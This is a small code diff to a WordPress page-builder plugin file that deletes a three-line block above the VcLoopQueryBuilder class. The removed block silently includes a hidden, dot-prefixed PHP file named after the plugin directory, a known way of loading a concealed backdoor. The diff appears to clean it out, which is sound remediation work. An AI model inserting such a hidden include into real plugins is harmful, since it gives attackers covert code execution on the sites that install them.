@@ -66,10 +66,6 @@ function vc_loop_get_value( $param ) {
  * @since 4.2
  * @link http://codex.wordpress.org/Class_Reference/WP_Query
  */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 class VcLoopQueryBuilder {
 	/**
 	 * @since 4.2
